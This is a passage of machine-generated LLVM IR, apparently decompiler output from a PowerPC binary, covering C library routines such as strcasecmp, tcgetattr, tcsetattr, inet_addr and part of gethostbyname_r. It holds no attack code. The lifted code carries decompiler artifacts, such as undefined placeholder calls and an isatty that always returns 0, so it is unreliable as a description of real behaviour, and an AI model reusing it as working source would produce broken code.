  %v2_10005228 = call i32 @memmove(i32 %arg2, i32 %arg1)
  ret i32 %v2_10005228
}

define i32 @__GI_strcasecmp(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_10005230 = load i32, i32* bitcast (i32** @global_var_1001d810.380 to i32*), align 4
  %v0_10005238.pre = load i32, i32* @r3, align 4
  %v1_10005238.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10005238

dec_label_pc_10005238:                            ; preds = %dec_label_pc_10005260, %entry
  %v0_100052746 = phi i32 [ %v0_100052747, %dec_label_pc_10005260 ], [ 0, %entry ]
  %v0_10005264 = phi i32 [ %v1_10005264, %dec_label_pc_10005260 ], [ %v1_10005238.pre, %entry ]
  %v0_10005268 = phi i32 [ %v1_10005268, %dec_label_pc_10005260 ], [ %v0_10005238.pre, %entry ]
  %v4_10005238 = icmp eq i32 %v0_10005268, %v0_10005264
  %.pre = inttoptr i32 %v0_10005268 to i8*
  br i1 %v4_10005238, label %dec_label_pc_10005260, label %dec_label_pc_10005240

dec_label_pc_10005240:                            ; preds = %dec_label_pc_10005238
  %v2_10005240 = load i8, i8* %.pre, align 1
  %v3_10005240 = zext i8 %v2_10005240 to i32
  %v1_10005244 = inttoptr i32 %v0_10005264 to i8*
  %v2_10005244 = load i8, i8* %v1_10005244, align 1
  %v3_10005244 = zext i8 %v2_10005244 to i32
  %v1_10005248 = mul nuw nsw i32 %v3_10005240, 2
  %v1_1000524c = mul nuw nsw i32 %v3_10005244, 2
  %v2_10005250 = add i32 %v1_10005248, %v3_10005230
  %v3_10005250 = inttoptr i32 %v2_10005250 to i16*
  %v4_10005250 = load i16, i16* %v3_10005250, align 2
  %v5_10005250 = sext i16 %v4_10005250 to i32
  %v2_10005254 = add i32 %v1_1000524c, %v3_10005230
  %v3_10005254 = inttoptr i32 %v2_10005254 to i16*
  %v4_10005254 = load i16, i16* %v3_10005254, align 2
  %v5_10005254 = sext i16 %v4_10005254 to i32
  %v2_10005258 = sub nsw i32 %v5_10005250, %v5_10005254
  %v4_1000525c = icmp eq i16 %v4_10005250, %v4_10005254
  br i1 %v4_1000525c, label %dec_label_pc_10005260, label %dec_label_pc_10005274

dec_label_pc_10005260:                            ; preds = %dec_label_pc_10005238, %dec_label_pc_10005240
  %v0_100052747 = phi i32 [ %v2_10005258, %dec_label_pc_10005240 ], [ %v0_100052746, %dec_label_pc_10005238 ]
  %v2_10005260 = load i8, i8* %.pre, align 1
  %v1_10005264 = add i32 %v0_10005264, 1
  %v1_10005268 = add i32 %v0_10005268, 1
  %v3_1000526c = icmp eq i8 %v2_10005260, 0
  br i1 %v3_1000526c, label %dec_label_pc_10005274, label %dec_label_pc_10005238

dec_label_pc_10005274:                            ; preds = %dec_label_pc_10005260, %dec_label_pc_10005240
  %v0_10005274 = phi i32 [ %v0_100052747, %dec_label_pc_10005260 ], [ %v2_10005258, %dec_label_pc_10005240 ]
  ret i32 %v0_10005274

; uselistorder directives
  uselistorder i32 %v2_10005258, { 1, 0 }
  uselistorder i32 %v0_10005268, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10005260, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1001d85c.381 to i32), i32* @r5, align 4
  %v1_10005284 = call i32 @strtok_r(i32 ptrtoint (i32* @global_var_1001d85c.381 to i32))
  ret i32 %v1_10005284
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-72 = alloca i32, align 4
  store i32 268456604, i32* @lr, align 4
  %v2_10005298 = call i32 @__GI_tcgetattr(i32* nonnull %stack_var_-72)
  ret i32 0

; uselistorder directives
  uselistorder i32 (i32*)* @__GI_tcgetattr, { 1, 0 }
}

define i32 @__GI_tcgetattr(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i8 @__decompiler_undefined_function_3()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_100052b8 = load i32, i32* @lr, align 4
  store i32 %v0_100052b8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_100052c8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268456668, i32* @lr, align 4
  %v3_100052d8 = call i32 @ioctl(i32 1076655123, i32 %v2_100052c8, i32 %v2_100052c8)
  %v2_100052dc = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100052dc, i32* @r4, align 4
  store i32 %v3_100052d8, i32* @r30, align 4
  %v3_100052e0 = icmp eq i32 %v3_100052d8, 0
  store i32 19, i32* @r5, align 4
  %v0_100052e8 = load i32, i32* @r31, align 4
  br i1 %v3_100052e0, label %dec_label_pc_100052f0, label %dec_label_pc_10005338

dec_label_pc_100052f0:                            ; preds = %entry
  %v1_100052e8 = add i32 %v0_100052e8, 17
  %v3_10005308 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_10005308, i32* %r0.global-to-local, align 4
  %v2_1000530c = add i32 %v0_100052e8, 4
  %v3_1000530c = inttoptr i32 %v2_1000530c to i32*
  store i32 %tmp7, i32* %v3_1000530c, align 4
  %v0_10005310 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005310 = load i32, i32* @r31, align 4
  %v2_10005310 = inttoptr i32 %v1_10005310 to i32*
  store i32 %v0_10005310, i32* %v2_10005310, align 4
  %v0_10005314 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005314 = load i32, i32* @r31, align 4
  %v2_10005314 = add i32 %v1_10005314, 8
  %v3_10005314 = inttoptr i32 %v2_10005314 to i32*
  store i32 %v0_10005314, i32* %v3_10005314, align 4
  %v0_10005318 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005318 = load i32, i32* @r31, align 4
  %v2_10005318 = add i32 %v1_10005318, 12
  %v3_10005318 = inttoptr i32 %v2_10005318 to i32*
  store i32 %v0_10005318, i32* %v3_10005318, align 4
  %v3_1000531c = load i32, i32* @r31, align 4
  %v4_1000531c = add i32 %v3_1000531c, 16
  %v5_1000531c = inttoptr i32 %v4_1000531c to i8*
  store i8 %tmp4, i8* %v5_1000531c, align 1
  %v1_10005320 = load i32, i32* @r31, align 4
  %v2_10005320 = add i32 %v1_10005320, 52
  %v3_10005320 = inttoptr i32 %v2_10005320 to i32*
  store i32 %tmp3, i32* %v3_10005320, align 4
  %v1_10005324 = load i32, i32* @r31, align 4
  %v2_10005324 = add i32 %v1_10005324, 56
  %v3_10005324 = inttoptr i32 %v2_10005324 to i32*
  store i32 %tmp2, i32* %v3_10005324, align 4
  store i32 268456748, i32* @lr, align 4
  %v6_10005328 = sext i8 %tmp4 to i32
  %v8_10005328 = call i32 @__GI_mempcpy(i32 %v1_100052e8, i32 %v2_100052dc, i32 19, i32 %tmp2, i32 %tmp3, i32 %v6_10005328, i32 %tmp7)
  store i32 268456760, i32* @lr, align 4
  %v3_10005334 = call i32 @__GI_memset(i32 %v8_10005328, i32 0, i32 13)
  %v0_1000533c.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10005338

dec_label_pc_10005338:                            ; preds = %entry, %dec_label_pc_100052f0
  %v0_1000533c = phi i32 [ %v3_100052d8, %entry ], [ %v0_1000533c.pre, %dec_label_pc_100052f0 ]
  store i32 %v0_100052b8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000533c

; uselistorder directives
  uselistorder i32 %v2_100052c8, { 1, 0 }
  uselistorder i32 %tmp7, { 1, 0 }
  uselistorder i32 13, { 1, 0 }
  uselistorder label %dec_label_pc_10005338, { 1, 0 }
}

define i32 @__GI_tcsetattr() local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10005350 = load i32, i32* @r4, align 4
  %v3_10005350 = icmp eq i32 %v0_10005350, 1
  %v0_10005360 = load i32, i32* @r3, align 4
  store i32 %v0_10005360, i32* @r27, align 4
  %v0_10005368 = load i32, i32* @r5, align 4
  store i32 %v0_10005368, i32* @r31, align 4
  br i1 %v3_10005350, label %dec_label_pc_1000538c, label %dec_label_pc_10005370

dec_label_pc_10005370:                            ; preds = %entry
  %v3_10005370 = icmp eq i32 %v0_10005350, 2
  br i1 %v3_10005370, label %dec_label_pc_100053ac, label %dec_label_pc_10005378

dec_label_pc_10005378:                            ; preds = %dec_label_pc_10005370
  %v3_10005378 = icmp eq i32 %v0_10005350, 0
  store i32 -2144570348, i32* @r30, align 4
  br i1 %v3_10005378, label %dec_label_pc_100053b4, label %dec_label_pc_10005398

dec_label_pc_1000538c:                            ; preds = %entry
  store i32 -2144570347, i32* @r30, align 4
  br label %dec_label_pc_100053b4

dec_label_pc_10005398:                            ; preds = %dec_label_pc_10005378
  %v0_10005398 = call i32 @__errno_location()
  store i32 -1, i32* @r28, align 4
  %v2_100053a4 = inttoptr i32 %v0_10005398 to i32*
  store i32 22, i32* %v2_100053a4, align 4
  br label %dec_label_pc_1000549c

dec_label_pc_100053ac:                            ; preds = %dec_label_pc_10005370
  store i32 -2144570346, i32* @r30, align 4
  br label %dec_label_pc_100053b4

dec_label_pc_100053b4:                            ; preds = %dec_label_pc_10005378, %dec_label_pc_1000538c, %dec_label_pc_100053ac
  %v1_100053b4 = inttoptr i32 %v0_10005368 to i32*
  %v2_100053b4 = load i32, i32* %v1_100053b4, align 4
  store i32 19, i32* @r5, align 4
  %v1_100053bc = add i32 %v0_10005368, 4
  %v2_100053bc = inttoptr i32 %v1_100053bc to i32*
  %v3_100053bc = load i32, i32* %v2_100053bc, align 4
  store i32 %v3_100053bc, i32* %r9.global-to-local, align 4
  %v1_100053c0 = add i32 %v0_10005368, 17
  store i32 %v1_100053c0, i32* @r4, align 4
  %v1_100053c4 = add i32 %v0_10005368, 8
  %v2_100053c4 = inttoptr i32 %v1_100053c4 to i32*
  %v3_100053c4 = load i32, i32* %v2_100053c4, align 4
  %v2_100053c8 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_100053c8, i32* @r3, align 4
  %v2_100053d0 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_100053d0, i32* @r26, align 4
  store i32 %v2_100053b4, i32* %stack_var_-72, align 4
  store i32 268456960, i32* @lr, align 4
  %v0_100053fc = call i32 @memcpy()
  %v0_10005400 = load i32, i32* @r27, align 4
  %v0_10005404 = load i32, i32* @r30, align 4
  store i32 268456980, i32* @lr, align 4
  %v3_10005410 = call i32 @ioctl(i32 %v0_10005400, i32 %v0_10005404, i32 %v2_100053d0)
  store i32 %v3_10005410, i32* @r28, align 4
  %v3_10005414 = icmp eq i32 %v3_10005410, 0
  br i1 %v3_10005414, label %dec_label_pc_1000541c, label %dec_label_pc_1000549c

dec_label_pc_1000541c:                            ; preds = %dec_label_pc_100053b4
  %v0_1000541c = load i32, i32* @r30, align 4
  %v3_10005420 = icmp eq i32 %v0_1000541c, -2144570348
  br i1 %v3_10005420, label %dec_label_pc_10005428, label %dec_label_pc_10005498

dec_label_pc_10005428:                            ; preds = %dec_label_pc_1000541c
  %v0_10005428 = call i32 @__errno_location()
  store i32 %v0_10005428, i32* @r29, align 4
  %v0_10005438 = load i32, i32* @r27, align 4
  %v1_10005440 = inttoptr i32 %v0_10005428 to i32*
  %v2_10005440 = load i32, i32* %v1_10005440, align 4
  store i32 %v2_10005440, i32* @r30, align 4
  store i32 268457036, i32* @lr, align 4
  %v3_10005448 = call i32 @ioctl(i32 %v0_10005438, i32 1076655123, i32 %v2_100053d0)
  %v3_1000544c = icmp eq i32 %v3_10005448, 0
  br i1 %v3_1000544c, label %dec_label_pc_1000545c, label %dec_label_pc_10005454

dec_label_pc_10005454:                            ; preds = %dec_label_pc_10005428
  %v0_10005454 = load i32, i32* @r30, align 4
  %v1_10005454 = load i32, i32* @r29, align 4
  %v2_10005454 = inttoptr i32 %v1_10005454 to i32*
  store i32 %v0_10005454, i32* %v2_10005454, align 4
  br label %dec_label_pc_1000549c

dec_label_pc_1000545c:                            ; preds = %dec_label_pc_10005428
  %v0_1000545c = load i32, i32* @r31, align 4
  %v1_1000545c = add i32 %v0_1000545c, 8
  %v2_1000545c = inttoptr i32 %v1_1000545c to i32*
  %v3_1000545c = load i32, i32* %v2_1000545c, align 4
  %v1_10005464 = call i32 @__asm_rlwinm(i32 %v3_1000545c, i32 0, i32 19, i32 20)
  %v1_10005468 = call i32 @__asm_rlwinm(i32 %v3_100053c4, i32 0, i32 19, i32 20)
  store i32 %v1_10005468, i32* %r9.global-to-local, align 4
  %v4_1000546c = icmp eq i32 %v1_10005464, %v1_10005468
  br i1 %v4_1000546c, label %dec_label_pc_10005474, label %dec_label_pc_10005488

dec_label_pc_10005474:                            ; preds = %dec_label_pc_1000545c
  %v1_10005474 = and i32 %v3_1000545c, 768
  store i32 %v1_10005474, i32* %r9.global-to-local, align 4
  %v3_10005474 = icmp eq i32 %v1_10005474, 0
  br i1 %v3_10005474, label %dec_label_pc_10005498, label %dec_label_pc_1000547c

dec_label_pc_1000547c:                            ; preds = %dec_label_pc_10005474
  %v1_1000547c = call i32 @__asm_rlwinm(i32 %v3_100053c4, i32 0, i32 22, i32 23)
  %v0_10005480 = load i32, i32* %r9.global-to-local, align 4
  %v4_10005480 = icmp eq i32 %v0_10005480, %v1_1000547c
  br i1 %v4_10005480, label %dec_label_pc_10005498, label %dec_label_pc_10005488

dec_label_pc_10005488:                            ; preds = %dec_label_pc_1000545c, %dec_label_pc_1000547c
  store i32 -1, i32* @r28, align 4
  %v1_10005490 = load i32, i32* @r29, align 4
  %v2_10005490 = inttoptr i32 %v1_10005490 to i32*
  store i32 22, i32* %v2_10005490, align 4
  br label %dec_label_pc_1000549c

dec_label_pc_10005498:                            ; preds = %dec_label_pc_1000541c, %dec_label_pc_1000547c, %dec_label_pc_10005474
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000549c

dec_label_pc_1000549c:                            ; preds = %dec_label_pc_100053b4, %dec_label_pc_10005454, %dec_label_pc_10005398, %dec_label_pc_10005488, %dec_label_pc_10005498
  %v0_100054a0 = load i32, i32* @r28, align 4
  ret i32 %v0_100054a0

; uselistorder directives
  uselistorder i32 %v0_10005368, { 1, 0, 3, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0, 4, 3 }
  uselistorder i32 19, { 3, 4, 5, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_1000549c, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10005498, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10005488, { 1, 0 }
  uselistorder label %dec_label_pc_100053b4, { 2, 1, 0 }
}

define i32 @ntohl() local_unnamed_addr {
entry:
  %v0_100054b4 = load i32, i32* @r3, align 4
  ret i32 %v0_100054b4
}

define i32 @ntohs() local_unnamed_addr {
entry:
  %v0_100054b8 = load i32, i32* @r3, align 4
  ret i32 %v0_100054b8
}

define i32 @htonl() local_unnamed_addr {
entry:
  %v0_100054bc = load i32, i32* @r3, align 4
  ret i32 %v0_100054bc
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %v0_100054c0 = load i32, i32* @r3, align 4
  ret i32 %v0_100054c0
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_100054cc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_100054cc, i32* @r4, align 4
  store i32 268457176, i32* @lr, align 4
  %v1_100054d4 = bitcast i32* %stack_var_-24 to i8*
  %v2_100054d4 = call i32 @inet_aton(i8* %v1_100054d4)
  %v3_100054d8 = icmp eq i32 %v2_100054d4, 0
  br i1 %v3_100054d8, label %dec_label_pc_100054e8, label %dec_label_pc_100054e4

dec_label_pc_100054e4:                            ; preds = %entry
  %v3_100054e4 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_100054e8

dec_label_pc_100054e8:                            ; preds = %entry, %dec_label_pc_100054e4
  %v0_100054f4 = phi i32 [ -1, %entry ], [ %v3_100054e4, %dec_label_pc_100054e4 ]
  ret i32 %v0_100054f4

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100054e8, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000550c = call i32 @__GI___h_errno_location()
  %v2_1000551c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268457268, i32* @lr, align 4
  %v7_10005530 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1001fe88.382, i32 ptrtoint (i32* @global_var_1001fcbc.383 to i32), i32 460, i32 %v2_1000551c, i32 %v0_1000550c)
  %v3_10005538 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_10005538
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_10005550 = load i32, i32* @lr, align 4
  store i32 %v0_10005550, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_10005558 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_10005578 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_10005578, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_10005558, label %dec_label_pc_1000587c, label %dec_label_pc_10005584

dec_label_pc_10005584:                            ; preds = %entry
  %v0_10005584 = call i32 @__errno_location()
  store i32 %v0_10005584, i32* %r3.global-to-local, align 4
  %v1_1000558c = inttoptr i32 %v0_10005584 to i32*
  %v2_1000558c = load i32, i32* %v1_1000558c, align 4
  store i32 %v2_1000558c, i32* @r27, align 4
  store i32 %v0_10005584, i32* %r28.global-to-local, align 4
  %v0_10005594 = load i32, i32* @r31, align 4
  store i32 %v0_10005594, i32* %v1_1000558c, align 4
  %v0_10005598 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000559c = load i32, i32* @r23, align 4
  store i32 %v0_1000559c, i32* %r3.global-to-local, align 4
  %v0_100055a0 = load i32, i32* %r30.global-to-local, align 4
  %v0_100055a4 = load i32, i32* %r29.global-to-local, align 4
  %v0_100055a8 = load i32, i32* %r20.global-to-local, align 4
  %v0_100055ac = load i32, i32* @r24, align 4
  store i32 268457396, i32* @lr, align 4
  %v7_100055b0 = call i32 @__get_hosts_byname_r(i32 %v0_1000559c, i32 2, i32 %v0_10005598, i32 %v0_100055a0, i32 %v0_100055a4, i32 %v0_100055a8, i32 %v0_100055ac)
  store i32 %v7_100055b0, i32* %r3.global-to-local, align 4
  %v3_100055b4 = icmp eq i32 %v7_100055b0, 0
  br i1 %v3_100055b4, label %dec_label_pc_1000587c, label %dec_label_pc_100055bc

dec_label_pc_100055bc:                            ; preds = %dec_label_pc_10005584
  %v0_100055bc = load i32, i32* @r24, align 4
  %v1_100055bc = inttoptr i32 %v0_100055bc to i32*
  %v2_100055bc = load i32, i32* %v1_100055bc, align 4
  store i32 %v2_100055bc, i32* %r0.global-to-local, align 4
  %v3_100055c0 = icmp eq i32 %v2_100055bc, 1
  br i1 %v3_100055c0, label %dec_label_pc_100055e4, label %dec_label_pc_100055c8

dec_label_pc_100055c8:                            ; preds = %dec_label_pc_100055bc
  %v3_100055c8 = icmp eq i32 %v2_100055bc, 4
  br i1 %v3_100055c8, label %dec_label_pc_100055e4, label %dec_label_pc_100055d0

dec_label_pc_100055d0:                            ; preds = %dec_label_pc_100055c8
  %v3_100055d0 = icmp eq i32 %v2_100055bc, -1
  br i1 %v3_100055d0, label %dec_label_pc_100055d8, label %dec_label_pc_1000587c

dec_label_pc_100055d8:                            ; preds = %dec_label_pc_100055d0
  %v0_100055d8 = load i32, i32* @r28, align 4
  %v1_100055d8 = inttoptr i32 %v0_100055d8 to i32*
  %v2_100055d8 = load i32, i32* %v1_100055d8, align 4
  store i32 %v2_100055d8, i32* %r0.global-to-local, align 4
  %v3_100055dc = icmp eq i32 %v2_100055d8, 2
  br i1 %v3_100055dc, label %dec_label_pc_100055e4, label %dec_label_pc_1000587c

dec_label_pc_100055e4:                            ; preds = %dec_label_pc_100055d8, %dec_label_pc_100055c8, %dec_label_pc_100055bc
  %v0_100055e4 = load i32, i32* @r30, align 4
  %v1_100055e4 = sub i32 0, %v0_100055e4
  store i32 %v1_100055e4, i32* %r0.global-to-local, align 4
  %v0_100055e8 = load i32, i32* @r27, align 4
  %v1_100055e8 = load i32, i32* @r28, align 4
  %v2_100055e8 = inttoptr i32 %v1_100055e8 to i32*
  store i32 %v0_100055e8, i32* %v2_100055e8, align 4
  %v0_100055ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100055ec = urem i32 %v0_100055ec, 4
  store i32 %v1_100055ec, i32* %r0.global-to-local, align 4
  %v3_100055ec = icmp eq i32 %v1_100055ec, 0
  %v0_10005604.pre = load i32, i32* @r29, align 4
  br i1 %v3_100055ec, label %dec_label_pc_10005604, label %dec_label_pc_100055f4

dec_label_pc_100055f4:                            ; preds = %dec_label_pc_100055e4
  %v2_100055f4 = icmp ult i32 %v0_10005604.pre, %v1_100055ec
  br i1 %v2_100055f4, label %dec_label_pc_10005878, label %dec_label_pc_100055fc

dec_label_pc_100055fc:                            ; preds = %dec_label_pc_100055f4
  %v2_100055fc = sub i32 %v0_10005604.pre, %v1_100055ec
  store i32 %v2_100055fc, i32* @r29, align 4
  %v0_10005600 = load i32, i32* @r30, align 4
  %v2_10005600 = add i32 %v0_10005600, %v1_100055ec
  store i32 %v2_10005600, i32* @r30, align 4
  br label %dec_label_pc_10005604

dec_label_pc_10005604:                            ; preds = %dec_label_pc_100055e4, %dec_label_pc_100055fc
  %v0_10005604 = phi i32 [ %v2_100055fc, %dec_label_pc_100055fc ], [ %v0_10005604.pre, %dec_label_pc_100055e4 ]
  %v1_1000560c = load i32, i32* @r24, align 4
  %v2_1000560c = inttoptr i32 %v1_1000560c to i32*
  store i32 -1, i32* %v2_1000560c, align 4
  %tmp29 = icmp ult i32 %v0_10005604, 4
  br i1 %tmp29, label %dec_label_pc_10005878, label %dec_label_pc_10005614

dec_label_pc_10005614:                            ; preds = %dec_label_pc_10005604
  %v0_10005614 = load i32, i32* @r29, align 4
  %v1_10005614 = add i32 %v0_10005614, -4
  store i32 %v1_10005614, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_10005614, 8
  br i1 %tmp30, label %dec_label_pc_10005878, label %dec_label_pc_10005620

dec_label_pc_10005620:                            ; preds = %dec_label_pc_10005614
  %v1_10005620 = add i32 %v0_10005614, -12
  store i32 %v1_10005620, i32* %r0.global-to-local, align 4
  %v0_10005624 = load i32, i32* @r30, align 4
  %v1_10005624 = add i32 %v0_10005624, 4
  store i32 %v1_10005624, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_10005630 = inttoptr i32 %v1_10005624 to i32*
  store i32 %v0_10005624, i32* %v3_10005630, align 4
  %v0_10005634 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005634 = load i32, i32* %r25.global-to-local, align 4
  %v2_10005634 = add i32 %v1_10005634, 4
  %v3_10005634 = inttoptr i32 %v2_10005634 to i32*
  store i32 %v0_10005634, i32* %v3_10005634, align 4
  %tmp31 = icmp ult i32 %v1_10005620, 32
  br i1 %tmp31, label %dec_label_pc_10005878, label %dec_label_pc_1000563c

dec_label_pc_1000563c:                            ; preds = %dec_label_pc_10005620
  %v0_1000563c = load i32, i32* @r29, align 4
  %v1_1000563c = add i32 %v0_1000563c, -44
  %tmp32 = icmp ult i32 %v1_1000563c, 256
  br i1 %tmp32, label %dec_label_pc_10005878, label %dec_label_pc_10005648

dec_label_pc_10005648:                            ; preds = %dec_label_pc_1000563c
  %v0_10005648 = load i32, i32* @r30, align 4
  %v1_10005648 = add i32 %v0_10005648, 44
  store i32 %v1_10005648, i32* @r31, align 4
  %v0_1000564c = load i32, i32* @r23, align 4
  store i32 %v0_1000564c, i32* @r4, align 4
  %v1_10005654 = add i32 %v0_10005648, 12
  store i32 %v1_10005654, i32* %r21.global-to-local, align 4
  store i32 %v1_10005648, i32* %r3.global-to-local, align 4
  store i32 268457568, i32* @lr, align 4
  %v3_1000565c = call i32 @strncpy(i32 %v1_10005648, i32 %v0_1000564c, i32 %v1_1000563c)
  %v0_10005660 = load i32, i32* @r31, align 4
  %v1_10005660 = load i32, i32* @r30, align 4
  %v2_10005660 = add i32 %v1_10005660, 12
  %v3_10005660 = inttoptr i32 %v2_10005660 to i32*
  store i32 %v0_10005660, i32* %v3_10005660, align 4
  %v0_10005664 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005664 = load i32, i32* %r21.global-to-local, align 4
  %v2_10005664 = add i32 %v1_10005664, 4
  %v3_10005664 = inttoptr i32 %v2_10005664 to i32*
  store i32 %v0_10005664, i32* %v3_10005664, align 4
  %v0_10005668 = load i32, i32* @r23, align 4
  store i32 %v0_10005668, i32* %r3.global-to-local, align 4
  %v0_1000566c = load i32, i32* @r30, align 4
  store i32 %v0_1000566c, i32* @r4, align 4
  store i32 268457588, i32* @lr, align 4
  %v2_10005670 = inttoptr i32 %v0_10005668 to i8*
  %v3_10005670 = call i32 @inet_aton(i8* %v2_10005670)
  store i32 %v3_10005670, i32* %r3.global-to-local, align 4
  store i32 %v3_10005670, i32* %r22.global-to-local, align 4
  %v3_10005674 = icmp eq i32 %v3_10005670, 0
  br i1 %v3_10005674, label %dec_label_pc_100056a8, label %dec_label_pc_1000567c

dec_label_pc_1000567c:                            ; preds = %dec_label_pc_10005648
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10005684 = load i32, i32* @r26, align 4
  %v2_10005684 = add i32 %v1_10005684, 8
  %v3_10005684 = inttoptr i32 %v2_10005684 to i32*
  store i32 2, i32* %v3_10005684, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000568c = load i32, i32* @r31, align 4
  %v1_1000568c = load i32, i32* @r26, align 4
  %v2_1000568c = inttoptr i32 %v1_1000568c to i32*
  store i32 %v0_1000568c, i32* %v2_1000568c, align 4
  %v0_10005690 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005690 = load i32, i32* @r26, align 4
  %v2_10005690 = add i32 %v1_10005690, 12
  %v3_10005690 = inttoptr i32 %v2_10005690 to i32*
  store i32 %v0_10005690, i32* %v3_10005690, align 4
  %v0_10005694 = load i32, i32* %r25.global-to-local, align 4
  %v1_10005694 = load i32, i32* @r26, align 4
  %v2_10005694 = add i32 %v1_10005694, 16
  %v3_10005694 = inttoptr i32 %v2_10005694 to i32*
  store i32 %v0_10005694, i32* %v3_10005694, align 4
  %v0_10005698 = load i32, i32* %r21.global-to-local, align 4
  %v1_10005698 = load i32, i32* @r26, align 4
  %v2_10005698 = add i32 %v1_10005698, 4
  %v3_10005698 = inttoptr i32 %v2_10005698 to i32*
  store i32 %v0_10005698, i32* %v3_10005698, align 4
  %v0_1000569c = load i32, i32* @r26, align 4
  %v1_1000569c = load i32, i32* @r20, align 4
  %v2_1000569c = inttoptr i32 %v1_1000569c to i32*
  store i32 %v0_1000569c, i32* %v2_1000569c, align 4
  %v0_100056a0 = load i32, i32* %r28.global-to-local, align 4
  %v1_100056a0 = load i32, i32* @r24, align 4
  %v2_100056a0 = inttoptr i32 %v1_100056a0 to i32*
  store i32 %v0_100056a0, i32* %v2_100056a0, align 4
  br label %dec_label_pc_1000587c

dec_label_pc_100056a8:                            ; preds = %dec_label_pc_10005648
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268457648, i32* @lr, align 4
  %v0_100056ac = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r29.global-to-local, align 4
  %v2_100056b4 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_100056b4, i32* %r28.global-to-local, align 4
  store i32 %v2_100056b4, i32* @r3, align 4
  %v0_100056c8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_1001d798.384 to i32), i32* %r3.global-to-local, align 4
  %v0_100056d0 = call i32 @__pthread_return_0()
  %v3_100056d8 = load i32, i32* @global_var_1001d888.385, align 4
